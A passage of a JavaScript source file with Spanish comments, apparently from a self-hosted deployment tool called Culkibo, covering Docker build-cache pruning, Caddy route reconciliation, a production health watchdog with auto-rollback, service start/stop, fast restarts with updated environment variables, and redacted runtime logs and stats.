   * baratos de reproducir. La caché general se conserva 60 días. Y se configura
   * en `/etc/docker/daemon.json` bajo `builder.gc`, NO en
   * `/etc/buildkit/buildkitd.toml` — ese fichero solo afecta a un buildkitd
   * independiente (drivers `docker-container`, `remote`, `kubernetes`), y
   * confundirlos es escribir una política que no se aplica nunca.
   *
   * Qué debería hacer Culkibo con esto:
   *   1. NO podar automáticamente después de cada despliegue. Eso es
   *      destruirse la caché a mano y volver a los 4,5 minutos de build de
   *      Coolify por otra vía.
   *   2. Gobernar por ESPACIO, no por antigüedad: lo que tumba un VPS de 40 GB
   *      es el disco lleno, no una capa de hace tres semanas.
   *   3. Dejarlo en manos del operador —esta función— y poder programarlo.
   *   4. A medio plazo, escribir `builder.gc.policy` en daemon.json durante la
   *      instalación para que el tope por defecto no sea el 80 % del disco en
   *      una máquina que además aloja las aplicaciones. Pendiente.
   *
   * Nota de CLI: `docker builder prune` acepta `--keep-storage`. En
   * `docker buildx prune` ese flag está deprecado a favor de
   * `--reserved-space`. Aquí se usa el primero, que es el del CLI base.
   */
  async pruneBuildCache({ keepStorageGb = 10, untilHours = null, force = false } = {}) {
    if (!force && this._activeBuilds > 0) {
      return {
        ok: false,
        busy: true,
        activeBuilds: this._activeBuilds,
        error: `No se puede podar la caché de BuildKit mientras hay ${this._activeBuilds} construcción(es) en curso`
      };
    }

    const docker = await this.detectDocker();
    if (!docker.available) return { ok: false, error: docker.reason };

    const gb = Number(keepStorageGb);
    if (!Number.isFinite(gb) || gb < 0 || gb > 10000) {
      return { ok: false, error: 'keepStorageGb debe ser un número entre 0 y 10000' };
    }

    const roundedGb = Math.round(gb);
    const effectiveGb = Math.min(roundedGb, MAX_BUILDKIT_KEEP_STORAGE_GB);
    const capped = roundedGb > MAX_BUILDKIT_KEEP_STORAGE_GB;
    const args = ['builder', 'prune', '--force', '--keep-storage', `${effectiveGb}GB`];
    if (untilHours != null) {
      const hours = Number(untilHours);
      if (!Number.isFinite(hours) || hours <= 0 || hours > 8760) {
        return { ok: false, error: 'untilHours debe ser un número entre 1 y 8760' };
      }
      args.push('--filter', `until=${Math.round(hours)}h`);
    }

    const res = await this.runDocker(args, { timeoutMs: 120000 });
    return res.code === 0
      ? { ok: true, keepStorageGb: effectiveGb, capped, output: (res.stdout || '').trim().slice(0, 2000) }
      : { ok: false, keepStorageGb: effectiveGb, capped, error: (res.stderr || '').trim().slice(0, 600) };
  }

  /**
   * Reconstruye las rutas de Caddy a partir de lo que Culkibo cree que está
   * desplegado. Se llama al arrancar el daemon: si Caddy se reinició y perdió
   * su configuración, el estado real vuelve a converger con el modelo. Dokploy
   * tiene un fallo abierto justo por no hacer esto: tras un reinicio sucio los
   * adjuntos de red no se reaplican y el modelo y la realidad divergen en
   * silencio.
   *
   * ADITIVA a propósito, a diferencia de `caddyManager.reconcile()`: aquí solo
   * se reponen las rutas de nuestros despliegues, nunca se borra ninguna. Una
   * ruta que Culkibo no reconoce puede ser de un despliegue anterior a este
   * proceso o algo que el operador puso a mano; arrancar el daemon no es momento
   * de tirar tráfico ajeno. La poda destructiva sigue disponible, explícita, en
   * `caddyManager.reconcile()`.
   */
  async reconcileRoutes() {
    // Delegar en ingressManager para conservar políticas por dominio (Basic Auth, IP Allowlist,
    // maxBodySizeMb, rateLimit, buckets exacto/comodín y redirecciones 301) en lugar de publicar rutas peladas.
    const ing = getIngressManager();
    if (ing && typeof ing.reconcile === 'function') {
      const res = await ing.reconcile();
      return { applied: (res.routes || []).map((r) => r.id || r), failed: res.applied ? [] : [{ error: res.reason || 'Caddy no disponible' }] };
    }
    return { applied: [], skipped: 'ingressManager no disponible' };
  }

  /**
   * Watchdog de producción: detecta contenedores OOMKilled, desaparecidos o en crash-loop
   * (`RestartCount >= 3`) en una sola llamada `docker inspect`, tolera fallos parciales,
   * aplica cooldown anti-spam (10 min) y protege contra ping-pong A<->B de auto-rollback.
   */
  async checkProductionHealth() {
    const docker = await this.detectDocker();
    if (!docker.available) return { checked: 0, incidents: [] };

    /** @type {Array<{ projectId: string, state: any }>} */
    const active = [];
    // Mantener lazy-load sin coste RAM en instalaciones sin Auto-Sleep/Advisor configurado
    const sleepAdv = (_sleepAdvisor || fs.existsSync(path.join(DATA_DIR, 'sleep-policies.json')) || fs.existsSync(path.join(DATA_DIR, 'advisor.json')))
      ? getSleepAdvisor()
      : null;
    for (const [projectId, state] of Object.entries(this.store)) {
      if (!state || !state.current || !state.current.containerName) continue;
      if (state.current.status === 'detenido' || state.current.status === 'stopped' || state.current.status === 'sleeping') {
        continue;
      }
      // Saltar despliegues de nodos remotos (monitorizados por serverFleetManager) y servicios dormidos (Scale-to-Zero)
      if (state.current.serverId && state.current.serverId !== 'local') continue;
      if (sleepAdv && typeof sleepAdv.isSleeping === 'function') {
        try { if (sleepAdv.isSleeping(projectId)) continue; } catch (e) {}
      }
      active.push({ projectId, state });
    }
    if (active.length === 0) return { checked: 0, incidents: [] };

    const names = active.map((a) => a.state.current.containerName);
    const res = await this.runDocker(
      ['inspect', '-f', '{{.Name}}|{{.State.Running}}|{{.State.OOMKilled}}|{{.RestartCount}}|{{.State.Status}}', ...names],
      { timeoutMs: 10000 }
    );
    // Docker imprime en stdout todos los contenedores que sí existen aunque alguno falte (exit 1).
    const byName = new Map();
    for (const line of (res.stdout || '').split(/\r?\n/).map((s) => s.trim()).filter(Boolean)) {
      const [rawName, running, oomKilled, restartCount, status] = line.split('|');
      byName.set(rawName.replace(/^\//, ''), {
        running: running === 'true',
        oomKilled: oomKilled === 'true',
        restartCount: parseInt(restartCount || '0', 10) || 0,
        status: status || 'unknown'
      });
    }
    // Si falló totalmente sin salida útil (daemon Docker caído), abortar sin falsos positivos
    if (res.code !== 0 && byName.size === 0 && !/no such/i.test(res.stderr || '')) {
      return { checked: active.length, incidents: [], error: (res.stderr || '').trim().slice(0, 200) };
    }

    /** @type {any[]} */
    const incidents = [];
    const pm = getProjectManager();
    const now = Date.now();
    const COOLDOWN_MS = 10 * 60 * 1000;

    for (const { projectId, state } of active) {
      const cName = state.current.containerName;
      const info = byName.get(cName) || {
        running: false,
        oomKilled: false,
        restartCount: 0,
        status: 'missing'
      };
      const degraded = info.oomKilled || info.restartCount >= 3 || (!info.running && info.status !== 'created');
      if (!degraded) {
        this._incidentCooldown.delete(cName);
        continue;
      }

      const reason = info.status === 'missing'
        ? `Contenedor ${cName} desaparecido del host Docker`
        : info.oomKilled
          ? 'Contenedor terminado por falta de memoria (OOMKilled)'
          : info.restartCount >= 3
            ? `Crash-loop detectado (${info.restartCount} reinicios)`
            : `Contenedor detenido inesperadamente (${info.status})`;

      const project = pm && typeof pm.getById === 'function' ? pm.getById(projectId) : null;
      let cd = this._incidentCooldown.get(cName);
      if (!cd) {
        cd = { lastNotifiedAt: 0, rolledBackPairs: new Set() };
        this._incidentCooldown.set(cName, cd);
      }

      const pairKey = `${state.current.deploymentId || cName}->${state.previous?.deploymentId || state.previous?.containerName || 'none'}`;
      const canAutoRollback = Boolean(
        project &&
        project.autoRollback &&
        state.previous &&
        !this.locks.has(projectId) &&
        !cd.rolledBackPairs.has(pairKey)
      );

      incidents.push({ projectId, containerName: cName, reason, autoRollback: canAutoRollback, ...info });
      this.emit('production_unhealthy', { projectId, containerName: cName, reason, ...info });

      if (now - cd.lastNotifiedAt >= COOLDOWN_MS || canAutoRollback) {
        cd.lastNotifiedAt = now;
        this.notify({
          event: 'production_unhealthy',
          level: 'error',
          title: `Incidente en producción: ${state.current.projectName || projectId}`,
          message: canAutoRollback ? `${reason}. Iniciando auto-rollback a ${state.previous.imageTag}.` : reason,
          projectId,
          projectName: state.current.projectName || projectId
        });
      }

      if (canAutoRollback) {
        cd.rolledBackPairs.add(pairKey);
        this.rollback(projectId, { trigger: 'auto-rollback' }).catch(() => {});
      } else if (info.restartCount >= 10 && info.status !== 'missing') {
        // Cortacircuitos anti-tormenta de reinicios (Dokku #3408): detener contenedor para proteger CPU/disco
        await this.runDocker(['stop', '--time', '5', cName], { timeoutMs: 15000 }).catch(() => {});
        state.current.status = 'crash_loop';
        this.saveStore();
      }
    }

    return { checked: active.length, incidents };
  }

  /** Detiene el servicio de producción de un proyecto sin borrar nada (serializado por lock). */
  async stopProduction(projectOrId) {
    const projectId = (projectOrId && typeof projectOrId === 'object') ? projectOrId.id : projectOrId;
    if (!projectId || typeof projectId !== 'string') throw new Error('Proyecto inválido');
    if (this.locks.has(projectId)) {
      throw new Error('Hay un despliegue en curso para este proyecto; espera a que termine antes de detenerlo');
    }
    const task = (async () => {
      this.cancelDrain(projectId);
      const state = this.getState(projectId);
      if (!state.current) return { stopped: false, reason: 'Este proyecto no tiene ningún despliegue activo' };
      const targetServerId = state.current.serverId || 'local';
      return this._withRemoteDockerEnv(targetServerId, {}, async (remoteDockerHost, fleet) => {
        const env = remoteDockerHost ? { ...process.env, DOCKER_HOST: remoteDockerHost } : undefined;
        try {
          await this._withRouteTarget(targetServerId, fleet, ({ adminUrl }) => caddyManager.removeRoute(projectId, { adminUrl }));
        } catch (e) {}
        const stopGraceSec = sanitizeBoundedInt(
          (projectOrId && typeof projectOrId === 'object' ? projectOrId.stopGracePeriodSec : undefined),
          DEFAULTS.stopGracePeriodSec,
          5,
          300
        );
        const res = await this.runDocker(['stop', '--timeout', String(stopGraceSec), state.current.containerName], { timeoutMs: (stopGraceSec + 20) * 1000, env });
        if (res.code === 0) {
          state.current.status = 'detenido';
          state.current.protected = true;
          this.saveStore();
          this.notify({
            event: 'project_stopped',
            level: 'info',
            title: `Servicio detenido: ${state.current.projectName || projectId}`,
            message: `El contenedor de producción ${state.current.containerName} fue detenido manualmente.`,
            projectId,
            projectName: state.current.projectName || projectId
          });
        }
        return { stopped: res.code === 0, containerName: state.current.containerName, error: res.code === 0 ? null : res.stderr.trim() };
      });
    })().finally(() => {
      if (this.locks.get(projectId) === task) this.locks.delete(projectId);
      // Nunca re-desplegar un push encolado justo después de parar el servicio manualmente
      this.pending.delete(projectId);
    });
    this.locks.set(projectId, task);
    return task;
  }

  /**
   * Vuelve a levantar el servicio que `stopProduction()` paró (serializado por lock).
   */
  async startProduction(projectOrId, options = {}) {
    const projectId = (projectOrId && typeof projectOrId === 'object') ? projectOrId.id : projectOrId;
    if (!projectId || typeof projectId !== 'string') throw new Error('Proyecto inválido');
    if (this.locks.has(projectId)) {
      throw new Error('Hay un despliegue en curso para este proyecto; espera a que termine antes de arrancarlo');
    }
    const task = (async () => {
      const opts = { ...DEFAULTS, ...options };
      const state = this.getState(projectId);
      if (!state.current) return { started: false, reason: 'Este proyecto no tiene ningún despliegue activo' };

      const target = state.current;
      const targetServerId = target.serverId || 'local';
      const isRemote = targetServerId !== 'local';

      return this._withRemoteDockerEnv(targetServerId, {}, async (remoteDockerHost, fleet) => {
        const dockerBaseEnv = remoteDockerHost ? { ...process.env, DOCKER_HOST: remoteDockerHost } : undefined;
        const docker = await this.detectDocker({ force: true, env: dockerBaseEnv });
        if (!docker.available) return { started: false, reason: docker.reason };

        const start = await this.runDocker(['start', target.containerName], { timeoutMs: 40000, env: dockerBaseEnv });
        if (start.code !== 0) {
          return {
            started: false,
            containerName: target.containerName,
            error: (start.stderr || '').trim() || `docker start terminó con código ${start.code}`
          };
        }

        const health = await this._withHealthTarget(targetServerId, fleet, target.hostPort, (probePort) =>
          this.waitForHealth({
            hostPort: probePort,
            containerPort: target.containerPort,
            healthPath: target.healthPath || DEFAULTS.healthPath,
            containerName: target.containerName,
            timeoutMs: opts.healthTimeoutMs,
            intervalMs: opts.healthIntervalMs,
            isRemote,
            dockerEnv: dockerBaseEnv,
            onProgress: null
          })
        );
        if (!health.healthy) {
          // Detener contenedor fallido para no dejarlo en crash-loop bajo --restart unless-stopped
          await this.runDocker(['stop', '--time', '5', target.containerName], { timeoutMs: 15000, env: dockerBaseEnv }).catch(() => {});
          return {
            started: false,
            containerName: target.containerName,
            error: `El contenedor arrancó pero no pasó la verificación de salud: ${health.reason}`
          };
        }

        target.status = 'activo';
        this.saveStore();

        if ((target.hostnames || []).length > 0 && target.upstream) {
          const fakeDep = { projectId, projectName: target.projectName || projectId, logLines: [] };
          const switched = await this._withRouteTarget(targetServerId, fleet, (routeOpts) =>
            this.switchRoute(fakeDep, target.hostnames, target.upstream, null, routeOpts)
          );
          if (!switched.ok) {
            return {
              started: true,
              routeRestored: false,
              containerName: target.containerName,
              error: `El servicio está arriba, pero no se pudo reponer la ruta: ${switched.error}`
            };
          }
        }

        return { started: true, routeRestored: true, containerName: target.containerName, error: null };
      });
    })().finally(() => {
      if (this.locks.get(projectId) === task) this.locks.delete(projectId);
      this.drainPending(projectId);
    });
    this.locks.set(projectId, task);
    return task;
  }

  /**
   * Reinicio rápido solo de runtime (`dokploy#2547`): recrea el contenedor desde la MISMA
   * `imageTag` ya construida aplicando las variables de entorno actualizadas (sin `docker build`,
   * sin `git fetch`, sin perder caché) con healthcheck + swap atómico de ruta zero-downtime.
   *
   * @param {string | any} projectOrId
   * @param {{
   *   envVars?: Record<string, string>,
   *   persistEnv?: boolean,
   *   dryRun?: boolean,
   *   skipDiskCheck?: boolean,
   *   memoryMb?: number,
   *   cpus?: string | number,
   *   healthTimeoutMs?: number,
   *   healthIntervalMs?: number,
   *   drainTimeoutMs?: number,
   *   stopGracePeriodSec?: number,
   *   logMaxSizeMb?: number,
   *   logMaxFiles?: number,
   *   actor?: string,
   *   actorIp?: string | null
   * }} [options]
   */
  async fastRestartWithEnv(projectOrId, options = {}) {
    const startedAt = Date.now();
    const projectId = (projectOrId && typeof projectOrId === 'object') ? projectOrId.id : projectOrId;
    if (!projectId || typeof projectId !== 'string') {
      const err = new Error('Proyecto inválido');
      /** @type {any} */ (err).status = 400;
      throw err;
    }

    const pm = getProjectManager();
    const liveProject = (projectOrId && typeof projectOrId === 'object')
      ? projectOrId
      : (pm && typeof pm.getById === 'function' ? pm.getById(projectId) : null);

    const state = this.getState(projectId);
    const current = state.current;
    if (!current || !current.imageTag) {
      return {
        restarted: false,
        rebuilt: false,
        status: 404,
        durationMs: Date.now() - startedAt,
        projectId,
        error: 'Este proyecto no tiene una imagen desplegada activa; ejecuta un despliegue inicial primero.'
      };
    }

    if (!options.skipDiskCheck) {
      const minFree = process.env.CULKIBO_MIN_FREE_BYTES != null
        ? Number(process.env.CULKIBO_MIN_FREE_BYTES)
        : STORE_MIN_DISK_FREE_BYTES;
      assertDiskHeadroom(DATA_DIR, minFree);
    }

    const linkedDb = liveProject
      ? this.resolveLinkedDatabases(liveProject)
      : { injectedEnv: {}, networks: [], secretValues: [] };
    /** @type {Record<string, string>} */
    const rawMergedEnv = {
      ...linkedDb.injectedEnv,
      ...((liveProject && liveProject.envVars) || {}),
      ...(options.envVars && typeof options.envVars === 'object' && !Array.isArray(options.envVars) ? options.envVars : {})
    };
    const em = getEnvironmentManager();
    /** @type {Record<string, string>} */
    let envVars = rawMergedEnv;
    if (em && typeof em.resolveVaultReferences === 'function') {
      try {
        const resolved = em.resolveVaultReferences(rawMergedEnv);
        if (resolved && typeof resolved === 'object') {
          envVars = resolved.resolved && typeof resolved.resolved === 'object' ? resolved.resolved : resolved;
        }
      } catch (e) {}
    }

    const validEnvNames = Object.keys(envVars).filter(isValidEnvName);
    const inlineEnvNames = validEnvNames.filter((k) => !HOST_HIJACK_ENV_BLOCKLIST.has(k.toUpperCase()));
    const fileOnlyEnvNames = validEnvNames.filter((k) => HOST_HIJACK_ENV_BLOCKLIST.has(k.toUpperCase()));

    const opts = { ...DEFAULTS, ...options };
    const rawMem = options.memoryMb != null ? Number(options.memoryMb) : Number(liveProject && liveProject.memoryMb);
    const safeMemMb = Number.isInteger(rawMem) && rawMem >= 32 && rawMem <= 65536 ? rawMem : opts.memoryMb;
    const rawCpus = options.cpus != null ? String(options.cpus) : String((liveProject && liveProject.cpus) || '');
    const safeCpus = /^[0-9]+(\.[0-9]+)?$/.test(rawCpus) ? rawCpus : opts.cpus;
    const containerPort = current.containerPort || (liveProject && liveProject.containerPort) || DEFAULTS.containerPort;
    const healthPath = sanitizeHealthPath((liveProject && liveProject.healthPath) || current.healthPath || DEFAULTS.healthPath);

    if (options.dryRun) {
      const previewArgs = this.runArgs({
        containerName: `culkibo_${safeSlug(projectId)}_env_preview`,
        imageTag: current.imageTag,
        hostPort: current.hostPort || 20000,
        containerPort,
        envNames: inlineEnvNames,
        envFile: fileOnlyEnvNames.length > 0 ? '<ephemeral-0600-env-file>' : null,
        network: opts.network,
        memoryMb: safeMemMb,
        cpus: safeCpus,
        pidsLimit: opts.pidsLimit
      });
      return {
        restarted: false,
        dryRun: true,
        rebuilt: false,
        durationMs: Date.now() - startedAt,
        projectId,
        imageTag: current.imageTag,
        previousContainerName: current.containerName,
        envKeysApplied: validEnvNames,
        memoryMb: safeMemMb,
        cpus: safeCpus,
        runArgsPreview: previewArgs
      };
    }

    if (this.locks.has(projectId)) {
      const err = new Error('Hay un despliegue o reinicio en curso para este proyecto; espera a que termine');
      /** @type {any} */ (err).status = 409;
      throw err;
    }

    const task = (async () => {
      const targetServerId = current.serverId || (liveProject && liveProject.serverId) || 'local';
      const isRemote = targetServerId !== 'local';
      const secrets = [
        ...Object.values(envVars),
        ...linkedDb.secretValues
      ].map((v) => String(v || '')).filter(Boolean);

      return this._withRemoteDockerEnv(targetServerId, {}, async (remoteDockerHost, fleet) => {
        const dockerBaseEnv = remoteDockerHost ? { ...process.env, DOCKER_HOST: remoteDockerHost } : undefined;
        const docker = await this.detectDocker({ force: true, env: dockerBaseEnv });
        if (!docker.available) {
          return {
            restarted: false,
            rebuilt: false,
            status: 503,
            durationMs: Date.now() - startedAt,
            projectId,
            error: docker.reason || 'Docker no está disponible en este host'
          };
        }

        // Confirmar que la imagen actual sigue presente (jamás dispara docker build)
        const imgCheck = await this.runDocker(['image', 'inspect', current.imageTag], { timeoutMs: 8000, env: dockerBaseEnv });
        if (imgCheck.code !== 0) {
          return {
            restarted: false,
            rebuilt: false,
            status: 404,
            durationMs: Date.now() - startedAt,
            projectId,
            imageTag: current.imageTag,
            error: `La imagen ${current.imageTag} ya no existe localmente; ejecuta un despliegue completo.`
          };
        }

        await this.ensureNetwork(opts.network, { env: dockerBaseEnv, cacheKey: isRemote ? targetServerId : null });
        const nextId = `fr_${Date.now().toString(36)}_${crypto.randomBytes(3).toString('hex')}`;
        const nextName = `culkibo_${safeSlug(projectId)}_env_${crypto.randomBytes(3).toString('hex')}`;
        const nextPort = isRemote
          ? await this._allocateRemotePort(targetServerId, fleet, remoteDockerHost)
          : await this.findFreePort(20000, nextId);

        /** @type {string | null} */
        let envFile = null;
        this.inFlightContainers.add(nextName);
        try {
          if (fileOnlyEnvNames.length > 0) {
            fs.mkdirSync(TMP_ENV_DIR, { recursive: true, mode: 0o700 });
            envFile = path.join(TMP_ENV_DIR, `fastenv_${crypto.randomBytes(8).toString('hex')}`);
            const lines = fileOnlyEnvNames.map((k) => `${k}=${String(envVars[k] == null ? '' : envVars[k]).replace(/[\r\n\0]+/g, ' ')}`);
            fs.writeFileSync(envFile, lines.join('\n') + '\n', { encoding: 'utf8', mode: 0o600 });
          }

          const projCfg = (projectOrId && typeof projectOrId === 'object') ? projectOrId : null;
          const runArgs = this.runArgs({
            containerName: nextName,
            imageTag: current.imageTag,
            hostPort: nextPort,
            containerPort,
            envNames: inlineEnvNames,
            envFile,
            network: opts.network,
            memoryMb: safeMemMb,
            cpus: safeCpus,
            pidsLimit: opts.pidsLimit,
            stopGracePeriodSec: options.stopGracePeriodSec !== undefined ? options.stopGracePeriodSec : (projCfg ? projCfg.stopGracePeriodSec : undefined),
            logMaxSizeMb: options.logMaxSizeMb !== undefined ? options.logMaxSizeMb : (projCfg ? projCfg.logMaxSizeMb : undefined),
            logMaxFiles: options.logMaxFiles !== undefined ? options.logMaxFiles : (projCfg ? projCfg.logMaxFiles : undefined),
            labels: {
              'culkibo.managed': 'true',
              'com.culkibo.project': safeSlug(projectId),
              'com.culkibo.project_id': projectId,
              'com.culkibo.deployment': nextId,
              'com.culkibo.fast_restart': 'true'
            }
          });
          const childRunEnv = {
            ...process.env,
            ...filterSafeHostEnv(envVars),
            ...(remoteDockerHost ? { DOCKER_HOST: remoteDockerHost } : {})
          };
          const runRes = await this.runDocker(runArgs, { timeoutMs: 45000, env: childRunEnv });
          if (runRes.code !== 0) {
            const msg = this.redact((runRes.stderr || '').trim() || `docker run falló en fast-restart (${runRes.code})`, secrets);
            return { restarted: false, rebuilt: false, status: 500, durationMs: Date.now() - startedAt, projectId, error: msg };
          }
        } finally {
          if (envFile) { try { fs.unlinkSync(envFile); } catch (e) {} }
          if (!isRemote) {
            this._pendingPorts.delete(nextPort);
            portRegistry.release(nextPort, nextId);
          }
          this.inFlightContainers.delete(nextName);
        }

        for (const dbNet of linkedDb.networks) {
          if (dbNet !== opts.network) {
            await this.runDocker(['network', 'connect', dbNet, nextName], { timeoutMs: 10000, env: dockerBaseEnv }).catch(() => {});
          }
        }

        const up = await this.resolveUpstream({
          containerName: nextName,
          containerPort,
          hostPort: nextPort,
          network: opts.network,
          env: dockerBaseEnv
        });

        const health = await this._withHealthTarget(targetServerId, fleet, nextPort, (probePort) =>
          this.waitForHealth({
            hostPort: probePort,
            containerPort,
            healthPath: healthPath || DEFAULTS.healthPath,
            containerName: nextName,
            timeoutMs: opts.healthTimeoutMs,
            intervalMs: opts.healthIntervalMs,
            isRemote,
            dockerEnv: dockerBaseEnv,
            onProgress: null
          })
        );
        if (!health.healthy) {
          await this.runDocker(['rm', '-f', nextName], { timeoutMs: 15000, env: dockerBaseEnv }).catch(() => {});
          return {
            restarted: false,
            rebuilt: false,
            status: 502,
            durationMs: Date.now() - startedAt,
            projectId,
            imageTag: current.imageTag,
            error: `El contenedor reiniciado no pasó el healthcheck (el contenedor previo sigue sirviendo tráfico): ${health.reason}`
          };
        }

        const hostnames = liveProject ? this.hostnamesFor(liveProject) : (current.hostnames || []);
        const record = {
          id: nextId,
          projectId,
          projectName: (liveProject && liveProject.name) || current.projectName || projectId,
          containerName: nextName,
          imageTag: current.imageTag,
          hostPort: nextPort,
          containerPort,
          upstream: up.dial,
          hostnames,
          healthPath,
          serverId: targetServerId,
          status: 'activo',
          fastRestart: true,
          startedAt: new Date(startedAt).toISOString(),
          finishedAt: new Date().toISOString(),
          logLines: []
        };

        let routeSwitched = false;
        if (hostnames.length > 0) {
          const switched = await this._withRouteTarget(targetServerId, fleet, (routeOpts) =>
            this.switchRoute(record, hostnames, up.dial, liveProject, routeOpts)
          );
          if (!switched.ok) {
            await this.runDocker(['rm', '-f', nextName], { timeoutMs: 15000, env: dockerBaseEnv }).catch(() => {});
            return {
              restarted: false,
              rebuilt: false,
              status: 502,
              durationMs: Date.now() - startedAt,
              projectId,
              error: `No se pudo conmutar la ruta tras el reinicio rápido: ${switched.error}`
            };
          }
          routeSwitched = true;
        }

        if (options.persistEnv && liveProject && options.envVars && pm && typeof pm.update === 'function') {
          try {
            pm.update(projectId, { envVars: { ...(liveProject.envVars || {}), ...options.envVars } });
          } catch (e) {}
        }

        const prevRelease = current;
        state.previous = prevRelease;
        state.current = {
          ...prevRelease,
          id: nextId,
          containerName: nextName,
          hostPort: nextPort,
          containerPort,
          upstream: up.dial,
          hostnames,
          healthPath,
          status: 'activo',
          updatedAt: new Date().toISOString()
        };
        state.history = [record, ...(state.history || [])].slice(0, 30);
        this.saveStore();

        if (prevRelease.containerName && prevRelease.containerName !== nextName) {
          const drain = this.drainAndRetire(record, prevRelease, opts)
            .catch(() => {})
            .finally(() => { if (this.drains.get(projectId) === drain) this.drains.delete(projectId); });
          this.drains.set(projectId, drain);
        }

        const durationMs = Date.now() - startedAt;
        this._recordAudit({
          source: 'deploy',
          action: 'deploy.fast_restart',
          resourceId: projectId,
          ip: options.actorIp || null,
          status: 200,
          detail: {
            imageTag: current.imageTag,
            previousContainerName: prevRelease.containerName,
            containerName: nextName,
            envKeysCount: validEnvNames.length,
            rebuilt: false,
            durationMs
          }
        });
        this.emit('deploy_fast_restart', {
          projectId,
          imageTag: current.imageTag,
          containerName: nextName,
          rebuilt: false,
          durationMs
        });

        return {
          restarted: true,
          rebuilt: false,
          durationMs,
          projectId,
          imageTag: current.imageTag,
          previousContainerName: prevRelease.containerName,
          containerName: nextName,
          hostPort: nextPort,
          upstream: up.dial,
          envKeysApplied: validEnvNames,
          routeSwitched
        };
      });
    })().finally(() => {
      if (this.locks.get(projectId) === task) this.locks.delete(projectId);
      this.drainPending(projectId);
    });
    this.locks.set(projectId, task);
    return task;
  }

  // -------------------------------------------------------------------------
  // 8. Logs en vivo, estadísticas y ejecución segura en contenedor de producción
  // -------------------------------------------------------------------------

  _secretValuesForProject(projectId) {
    const pm = getProjectManager();
    const project = pm && typeof pm.getById === 'function' ? pm.getById(projectId) : null;
    if (!project) return [];
    const linked = this.resolveLinkedDatabases(project);
    return [
      ...Object.values(project.envVars || {}),
      ...Object.values(project.buildArgs || {}),
      ...Object.values(project.buildSecrets || {}),
      ...linked.secretValues
    ];
  }

  /** Obtiene los últimos logs del contenedor de producción (actual o anterior), con secretos redactados. */
  async getRuntimeLogs(projectId, { tail = 200, since = null, timestamps = true, target = 'current' } = {}) {
    const state = this.getState(projectId);
    const release = target === 'previous' ? state.previous : state.current;
    if (!release || !release.containerName) {
      return {
        ok: false,
        running: false,
        containerName: null,
        error: `No hay contenedor de producción (${target}) para este proyecto`,
        lines: [],
        output: ''
      };
    }
    const safeTail = Math.min(5000, Math.max(1, parseInt(String(tail || 200), 10) || 200));
    const args = ['logs', '--tail', String(safeTail)];
    if (timestamps) args.push('--timestamps');
    if (since) {
      const cleanSince = String(since).trim();
      if (!/^(\d+[smhd]|\d{4}-\d{2}-\d{2}T[\d:.+-Z]+)$/.test(cleanSince)) {
        return { ok: false, status: 400, error: 'Parámetro since inválido (usa p. ej. 15m, 1h o ISO-8601)', lines: [] };
      }
      args.push('--since', cleanSince);
    }
    args.push(release.containerName);

    const targetServerId = release.serverId || 'local';
    const res = await this._withRemoteDockerEnv(targetServerId, {}, (remoteDockerHost) =>
      this.runDocker(args, {
        timeoutMs: 15000,
        env: remoteDockerHost ? { ...process.env, DOCKER_HOST: remoteDockerHost } : undefined
      })
    );
    const secrets = this._secretValuesForProject(projectId);
    const combined = [res.stdout, res.stderr]
      .filter(Boolean)
      .join('\n')
      .split(/\r?\n/)
      .filter(Boolean)
      .map((line) => this.redact(line, secrets));
    if (timestamps) combined.sort();

    return {
      ok: res.code === 0,
      containerName: release.containerName,
      target,
      tail: safeTail,
      lines: combined,
      error: res.code === 0 ? null : this.redact((res.stderr || '').trim().slice(0, 300), secrets)
    };
  }

  /**
   * Inicia un stream `docker logs -f` seguro con límite global de streams simultáneos.
   * @param {string} projectId
   * @param {{ tail?: number | string, target?: string, onLine?: ((payload: { stream: string, line: string }) => void) | null, onEnd?: ((code: number | null) => void) | null }} [opts]
   */
  streamRuntimeLogs(projectId, { tail = 100, target = 'current', onLine = null, onEnd = null } = {}) {
    const state = this.getState(projectId);
    const release = target === 'previous' ? state.previous : state.current;
    if (!release || !release.containerName) {
      const err = new Error(`No hay contenedor de producción (${target}) para este proyecto`);
      /** @type {any} */ (err).status = 404;
      throw err;
    }
    if (this._activeLogStreams >= MAX_RUNTIME_LOG_STREAMS) {
      const err = new Error(`Límite global de ${MAX_RUNTIME_LOG_STREAMS} streams de logs simultáneos alcanzado`);
      /** @type {any} */ (err).status = 503;
      throw err;
    }

    const safeTail = Math.min(2000, Math.max(1, parseInt(String(tail || 100), 10) || 100));
    const secrets = this._secretValuesForProject(projectId);
    const child = spawn(
      'docker',
      ['logs', '-f', '--tail', String(safeTail), '--timestamps', release.containerName],
      { shell: false, windowsHide: true }
    );
    this._activeLogStreams++;
    let closed = false;

    const closeStream = () => {
      if (closed) return;
      closed = true;
      this._activeLogStreams = Math.max(0, this._activeLogStreams - 1);
      try { child.kill('SIGTERM'); } catch (e) {}
      const esc = setTimeout(() => { try { child.kill('SIGKILL'); } catch (e) {} }, 3000);
      if (esc.unref) esc.unref();
    };

    const pump = (streamName) => {
      let buf = '';
      return (chunk) => {
        buf += chunk.toString();
        const parts = buf.split(/\r?\n/);
        buf = parts.pop() || '';
        for (const raw of parts) {
          if (raw && onLine) onLine({ stream: streamName, line: this.redact(raw, secrets) });
        }
      };
    };
    child.stdout.on('data', pump('stdout'));
    child.stderr.on('data', pump('stderr'));
    child.on('close', (code) => {
      closeStream();
      if (onEnd) onEnd(code);
    });
    child.on('error', () => {
      closeStream();
      if (onEnd) onEnd(-1);
    });

    return { containerName: release.containerName, close: closeStream };
  }

  /** Estadísticas en directo del contenedor de producción (CPU, RAM, PIDs, red, reinicios, OOM). */
  async getRuntimeStats(projectId) {
    const state = this.getState(projectId);
    const release = state.current;
    if (!release || !release.containerName) {
      return {
        ok: false,
        running: false,
        containerName: null,
        error: 'No hay contenedor de producción activo para este proyecto'
      };
    }
    const [insp, st] = await Promise.all([
      this.runDocker(
        ['inspect', '-f', '{{.Id}}|{{.State.Status}}|{{.State.Running}}|{{.State.OOMKilled}}|{{.RestartCount}}|{{.State.StartedAt}}|{{if .State.Health}}{{.State.Health.Status}}{{else}}none{{end}}', release.containerName],
        { timeoutMs: 8000 }
      ),
      this.runDocker(['stats', '--no-stream', '--format', '{{json .}}', release.containerName], { timeoutMs: 10000 })
    ]);
    if (insp.code !== 0) {
      return {
        ok: false,
        running: false,
        containerName: release.containerName,
        error: `Contenedor ${release.containerName} no encontrado en Docker`
      };
    }
    const [containerId, status, running, oomKilled, restartCount, startedAt, health] = (insp.stdout || '').trim().split('|');
    /** @type {any} */
    let statsObj = null;
    if (st.code === 0 && (st.stdout || '').trim()) {
